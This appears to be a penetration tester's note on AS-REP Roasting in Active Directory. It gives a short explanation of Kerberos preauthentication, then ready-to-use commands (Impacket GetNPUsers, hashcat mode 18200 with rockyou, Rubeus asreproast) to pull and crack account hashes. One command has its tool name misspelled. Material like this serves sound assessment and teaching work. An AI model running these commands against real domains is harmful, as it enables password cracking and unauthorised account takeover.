# Overview
>The first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as _Kerberos preauthentication_ prevents offline password guessing.
>Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as _AS-REP Roasting_.
>By default, the AD user account option _Do not require Kerberos preauthentication_ is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.

# Exploit
## Linux
```bash
# You don't have user account but know some usernames on the domain
GetNPUsers.py -no-pass -dc-ip <dc-ip> htb/<user>

# You have an user account
GetNPUser.py <domain>/<username> -no-pass -dc-ip <dc-ip> -request -outputfile hashes.asreproast

# crack the hash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Windows
```powershell
.\Rubeus.exe asreproast /nowrap
```